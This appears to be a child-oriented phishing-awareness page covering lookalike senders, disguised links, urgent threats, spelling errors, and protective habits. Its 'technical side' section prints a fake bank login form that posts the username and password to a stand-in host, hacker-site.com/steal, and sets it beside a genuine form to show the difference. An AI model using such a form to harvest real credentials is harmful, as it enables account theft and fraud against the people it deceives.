Learn About Phishing Emails

What is Phishing?

Phishing is when bad people try to trick you with fake emails, messages, or websites. They want to steal your personal information like passwords, credit card numbers, or other private data.

The word "phishing" sounds like "fishing" because hackers are "fishing" for your information using "bait" (the fake emails).

Why is Phishing Dangerous?

  • Hackers can steal your passwords
  • They can take your money
  • They can pretend to be you online
  • They can steal your identity
  • They can install viruses on your computer

How to Spot a Phishing Email

Check the Sender's Email

Look carefully at who sent the email. Phishing emails often have email addresses with small mistakes.

Real: support@paypal.com

Fake: support@paypa1.com (notice the number "1" instead of letter "l")

Check Links Before Clicking

Hover your mouse over a link (don't click!) to see where it really goes. The real website address will show up at the bottom of your browser.

What you see: www.amazon.com

Where it actually goes: www.amaz0n-account.xyz

Look for Urgency or Threats

Phishing emails often try to scare you or rush you into action. They might say your account will be deleted or you'll lose money if you don't act fast.

Example: "URGENT: Your account has been compromised! Click here immediately or your account will be deleted in 24 hours!"

Check for Spelling and Grammar Errors

Real companies check their emails carefully before sending them. Phishing emails often have spelling mistakes or weird grammar.

Example: "Dear Valued Customer, We need to verify you're account information. Please to click below for confirm your details."

How Phishing Works: The Technical Side

Let's look at how phishing websites work behind the scenes:

Real Login Page HTML:

<!-- Real Bank Website -->
<form action="https://realbank.com/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username">
  
  <label for="password">Password:</label>
  <input type="password" id="password" name="password">
  
  <button type="submit">Login</button>
</form>

Fake Phishing Page HTML:

<!-- Fake Bank Website -->
<form action="https://hacker-site.com/steal" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username">
  
  <label for="password">Password:</label>
  <input type="password" id="password" name="password">
  
  <button type="submit">Login</button>
</form>

Notice the Difference!

The fake page looks exactly the same to you, but when you click "Login" your information is sent to the hacker's website (hacker-site.com) instead of to your real bank!

How to Protect Yourself from Phishing

Never Click Suspicious Links

If you get an email with a link, don't click it right away. Check where it goes first by hovering your mouse over it (don't click!).

If you need to visit a website, type the address directly in your browser instead of clicking links.

Use Different Passwords

Use different passwords for different websites. This way, if hackers get one password, they can't access all your accounts.

A password manager can help you remember lots of different passwords.

Be Careful with Attachments

Don't open email attachments unless you are expecting them. Files like .exe, .zip, or .doc can contain viruses.

If someone you know sends a strange attachment, check with them first before opening it.

When in Doubt, Ask for Help

If you're not sure about an email, ask a trusted adult to help you.

You can also contact the company directly using their official phone number or website (type it yourself) to check if the email is real.
